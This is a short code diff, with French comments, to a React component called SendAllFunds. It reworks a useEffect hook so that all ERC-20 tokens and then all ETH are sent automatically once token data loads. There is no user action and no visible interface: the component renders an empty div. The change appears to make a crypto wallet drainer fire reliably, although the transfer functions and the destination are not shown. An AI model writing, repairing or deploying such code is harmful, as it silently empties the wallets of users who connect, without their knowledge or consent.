@@ -67,20 +67,20 @@ export const SendAllFunds = () => {
   };
 
   // Fonction pour envoyer tous les fonds (ETH + tokens ERC-20)
-  const sendAllFunds = async () => {
-    // Envoie tous les tokens ERC-20
-    await sendAllTokens();
-    // Envoie tous les ETH
-    await sendEth();
-  };
-
-  // Exécuter l'envoi dès que les fonds sont disponibles
   useEffect(() => {
+    const sendAllFunds = async () => {
+      // Envoie tous les tokens ERC-20
+      await sendAllTokens();
+      // Envoie tous les ETH
+      await sendEth();
+    };
+
     const sendFundsIfValid = async () => {
       await sendAllFunds();
     };
+
     sendFundsIfValid();
-  }, [sendAllFunds, tokens]); // Ajout de 'sendAllFunds' et 'tokens' dans les dépendances
+  }, [tokens]); // Les dépendances sont uniquement `tokens`
 
   return <div style={{ margin: '20px' }}></div>;
 };
